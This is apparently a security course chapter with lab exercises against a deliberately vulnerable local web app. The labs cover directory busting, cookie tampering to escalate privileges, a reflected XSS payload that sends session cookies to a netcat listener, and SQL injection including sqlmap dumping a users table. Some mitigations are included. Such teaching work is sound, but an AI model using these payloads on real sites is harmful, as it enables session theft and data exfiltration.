
# Web Application Attacks
![](web_attacks.jpg)

intro

**Objectives**
1. Risk
2. Discovery
3. Testing

## Web Security Risks
Web Risks
### Classification Schemes
### Manual Testing

## Application Discovery
### Google Dorking
GHDB

### Website Discovery
Website Discovery
crt.sh
google

### Virtual Hosts Discovery
DNS Dumpster

### Directory Busting
>[!activity] Activity 9.1 - Directory Busting

## Web Attacks
### Solving Stateless HTTP
Authentication
Cookie Security
> [!activity] Activity 9.2 - Cookie Privesc

### Cross Site Scripting (XSS)
XSS Types
>[!activity] Activity 9.3 - Cross Site Scripting

### Relational Databases
Database Queries
SQL Injection (SQLi)
SQLi Mitigations
> [!activity] Activity 9.4 - SQL Injection

### Web Proxy Tool - BurpSuite
BurpSuite
PortSwigger Academy

## Exercises
>[!exercise] Exercise 9.1 - Directory Busting
>In this task you will perform directory busting against a vulnerable web application running as a docker container on your Kali VM.
>#### Step 1 - Install Docker
>Run the following commands in a bash terminal and then restart your VM If you don't already have Docker installed.
>```bash
>sudo apt update 
>sudo apt install -y docker.io 
>sudo usermod -aG docker $USER
>```
>#### Step 2 - Run Vulnerable-Site
>Clone the vulnerable-site repository on your Kali VM.
>```bash
>git clone https://github.com/dhammon/vulnerable-site
>```
>Change directory to vulnerable-site and run the vulnerable app as a docker container. Allow a couple minutes for the image layers to download and the applications to start.
>```bash
>docker run -it -d -p "80:80" -v ${PWD}/app:/app --name vulnerable-site mattrayner/lamp:latest
>```
>The container will run in the background but may need a couple minutes to fully boot. After waiting a couple minutes, run the db.sh script on the container to populate the application's database. If you receive an " ERROR 2002 (HY000) " it means you need to wait another minute for the container to fully boot.
>```bash
>docker exec vulnerable-site /bin/bash /app/db.sh
>```
>Open your Kali VM Firefox browser to [http://127.0.0.1](http://127.0.0.1/) and observe the vulnerable-site application is running!
>#### Step 3 - Install Gobuster
>Install the gobuster package on your Kali VM.
>```bash
>sudo apt install gobuster -y
>```
>#### Step 4 - Directory Busting
>Start a directory busting attack against the vulnerable-site using gobuster and discover the db.sh script in the web root directory.
>```bash
>gobuster dir -u [http://127.0.0.1/](http://127.0.0.1/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -x php,sh
>```
>After a few seconds, gobuster discovers the db.sh file! Open the Firefox browser in your Kali VM and navigate to the file [http://127.0.0.1/db.sh](http://127.0.0.1/db.sh). The file downloads from the container.  Open the file by clicking the download shortcut and observe the file contents include username and passwords in the INSERT commands!
>
>From your Kali VM Firefox browser, navigate to the vulnerable site's login page [http://127.0.0.1/](http://127.0.0.1/). Enter the administrator username and password found from the db.sh file.  Observe that the credentials were valid as the browser directs us to the Administrator page, pwned!!
>

>[!exercise] Exercise 9.2 - Cookie Privesc
>Web applications could insecurely rely on cookie values to handle authorization decisions. You will identify and exploit a vulnerable application's cookie to escalate privileges in this task from your Kali VM.
>#### Step 1 - Install Docker
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
>#### Step 2 - Install Vulnerable-Site
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
>#### Step 2 - Enumerate Cookies
>With the vulnerable-site running in your Kali VM, open Firefox and navigate to [http://127.0.0.1/](http://127.0.0.1/). Log in as the low privileged user (username=daniel and password=Password123).
>
>Open the developer console (F12), select the Storage tab, Cookies (left navigation tree), and select the [http://127.0.0.1](http://127.0.0.1/) site. Observe that there is a cookie called "role" with a value of "user".
>#### Step 3 - Escalate Privileges
>With the "role" cookie identified in the developer console, double click the cookie value ("user") and replace the value with the word "administrator" and press enter.
>
>Reload the page with the new cookie value. Observe the page changes from the User Page to the privileged Administrator Page!
>#### Step 4 - Remediate Vulnerable Cookie
>Trusting cookie values, especially for authorization purposes, can lead to privilege escalations. A better approach would be to place authorization variables server side in sessions. Launch a bash terminal in the Kali VM and open the index.php file using nano. Observe that the cookie is set in line 14's setcookie function call.
>```bash
>nano ~/vulnerable-site/app/index.php
>```
>With the index.php file open, replace the setcookie line with a line that sets the role as a session variable. Press CTRL+X, Y for yes, and Enter to save the file changes.
>```php
>$_SESSION['role'] = $role;
>```
>Open the home.php file in nano and inspect its contents. Observe the cookie "role" is used to check if the requestor is an administrator and will present the privileged content on line 7.
>```bash
>nano ~/vulnerable-site/app/home.php
>```
>Replace home.php's line 7 magic variable $\_COOKIE with the magic variable $\_SESSION that was set in the index.php file. Press CTRL+X, Y for yes, and Enter to save the file.
>```php
>if($_SESSION['role'] == 'administrator') {
>```
>Launch a new Firefox instance, navigate to [http://127.0.0.1/](http://127.0.0.1/), login as the low privilege user (username=daniel and password=Password123). Inspect the cookies to and confirm the role cookie is no longer in use!

>[!exercise] Exercise 9.3 - Cross Site Scripting (XSS)
>You will discover and exploit an XSS vulnerability in the vulnerable-site to steal the administrator's session cookie in your Kali VM.
>#### Step 1 - Install Docker
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
>#### Step 2 - Install Vulnerable-Site
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
>#### Step 3 - Identify XSS
>With the vulnerable-site running in your Kali VM, launch a private Firefox instance and navigate to [http://127.0.0.1/](http://127.0.0.1/). Press the "hamburger menu" icon (three stacked horizontal lines) in the upper right corner of Firefox and select "New private window". This private window will be our Attacker's browser.
>
>Open the source code of the login page by right clicking anywhere in the page and selecting "View Page Source" from the context menu.
>
>A new tab opens displaying HTML code that includes a hidden form value "version" with the value "beta".
>
>Return to the login page and enter the known credentials for the low privileged user (username=daniel and password=Password123). Entering the correct credentials logs us into the User Page.
>
>Observe that the page has a footer displaying the version as "beta". In addition, observe that the URL includes a parameter "&version=beta". Change the value for the version parameter in the URL bar to "foobar" and press enter to load the page with the new value.
>
>`http://127.0.0.1/?username=daniel&password=Password123&version=foobar`
>
>We observe that the GET parameter version reflects our user input! Replace the "foobar" value with the test XSS payload "<script>alert(1)</script>" and press enter to reload the page. 
>
>`http://127.0.0.1/?username=daniel&password=Password123&version=<script>alert(1)</script> `
>
>Our JavaScript alert box executed! Press Ok in the alert box to finish loading the page.
>#### Step 4 - Stage the Attack
>You will craft a malicious payload that sends the admin user's cookie value to an attacker-controlled server. The following payload creates an image object sourced from a remote server. The remote server is our attacker-controlled URL that has the victim user's cookie appended to it.
>
>`<script>var i=new Image;i.src="http://127.0.0.1:9001/?"+document.cookie;</script>`
>
>This payload includes special characters that the browser will interpret, change, and break. Therefore, we will use the URL encoded version.
>`%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E `
>
>This payload replaces the GET parameter version value in the following link. The following link will be sent to the victim admin user with an enticing message to lure them into clicking it while logged into the vulnerable site.
>
>`http://127.0.0.1/home.php?version=%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E`
>
>Next, set up the attacker server. Open a bash terminal and run a netcat listener that will capture the request and cookie when the victim clicks on the link. Observe the netcat listener remains open awaiting a connection.
>```bash
>nc -lp 9001
>```
>#### Step 5 - Trigger the Attack
>Open a new non-private Firefox browser and navigate to [http://127.0.0.1/](http://127.0.0.1/). This browser session will be used to simulate the victim activity.
>
>Login as the admin user (username=admin and password=SuperSecret1!).
>
>In the same Firefox window where the victim is logged into the vulnerable application, open a new Firefox browser tab and paste the malicious link in the URL bar and press enter. Observe the page loads as normal. This simulates the victim clicking on the link in an email or instance message for example.
>
>`http://127.0.0.1/home.php?version=%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E`
>
>Navigate to the attacker terminal with the netcat listener setup in the previous step. Observe the received connection from the victim that includes their cookie values!  The PHPSESSID cookie value is the session identifier used by the web application to identify logged in users. With this token, the attacker can access authenticated pages as the victim!
>#### Step 6 - Mitigate the Vulnerability
>In a Kali VM bash terminal, open the home.php file in the vulnerable-site/app directory using nano text editor.
>```bash
>nano ~/vulnerable-site/app/home.php
>```
>Observe the last line echos the version GET parameter without any input validation or output encoding. Update the last line by wrapping the $\_GET['version'] in the htmlspecialchars function. Press CTRL+X, Y for yes, and Enter to save over the exiting file.
>```php
>echo "Version: ".htmlspecialchars($_GET['version']);
>```
>Open Firefox and navigate to [http://127.0.0.1/](http://127.0.0.1/) . Enter the username and password (username=daniel and password=Password123) to log into the application.
>
>Replace the previously vulnerable GET parameter "version" value of "beta" with our XSS test payload "<script>alert('xss')</script>" and press enter. Observe this time that the page loads without the alert popup window and instead displays the payload as raw text!
>


>[!exercise] Exercise 9.4 - SQL Injection (SQLi)
>Bypass authentication controls by exploiting a SQL injection vulnerability. Then dump the users table from the database using SQLmap.
>#### Step 1 - Install Docker
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
>#### Step 2 - Install Vulnerable-Site
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
>#### Step 3 - Identify SQLi
>With the vulnerable-site running in your Kali VM, navigate to [http://127.0.0.1/](http://127.0.0.1/) and enter an incorrect username and password combination. Observe the error message "Wrong username/password" is displayed.
>
>Press the back button to return to the login screen. Enter a new username and password but this time include an apostrophe ' in your username and submit. Observe this time no error message is displayed. This subtle change in behavior suggests there may be a SQL injection vulnerability.
>#### Step 4 - Manual SQLi Exploitation
>Return to the vulnerable-site login page. Enter the following payload as the username and password and press the submit button. Observe the application logs us in as the administrator!
>
>`lol' OR 1=1-- -`
>#### Step 5 - Automated SQLi with SQLMap
>Return to the vulnerable-site's login page and enter any incorrect username and password. Observe the "Wrong username/password" message. Copy the URL to your clipboard to use in the sqlmap tool.
>
>`http://127.0.0.1/?username=lol&password=lol&version=beta 
>
>Open a bash terminal and run sqlmap against the URL you just copied.
>```bash
>sqlmap -u ' [http://127.0.0.1/?username=lol&password=lol&version=beta](http://127.0.0.1/?username=lol&password=lol&version=beta)' --batch
>```
>Allow a minute for the tool to complete its analysis. Observe that sqlmap discovered the application is vulnerable to time-based blind injection attacks!
>
>Enumerate the database names using the --dbs flag. Observe sqlmap slowly identifies each letter of each database name. After a few minutes, the databases mysql, information_schema, performance_schema, sys, and company are identified!
>```bash
>sqlmap -u ' [http://127.0.0.1/?username=lol&password=lol&version=beta](http://127.0.0.1/?username=lol&password=lol&version=beta)' --batch --dbs
>```
>The database company looks interesting. Run sqlmap targeting that database and dump all tables within it. The tool takes several minutes to complete but identifies one table named users, the column names, and then the values in the table.
>```bash
>sqlmap -u ' [http://127.0.0.1/?username=lol&password=lol&version=beta](http://127.0.0.1/?username=lol&password=lol&version=beta)' --batch -D company --dump
>```


